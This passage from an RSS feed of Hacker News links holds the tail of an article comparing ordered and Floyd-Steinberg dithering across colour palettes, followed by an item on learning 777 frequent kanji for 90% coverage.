<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn’t really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error…</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
    </channel>
</rss>
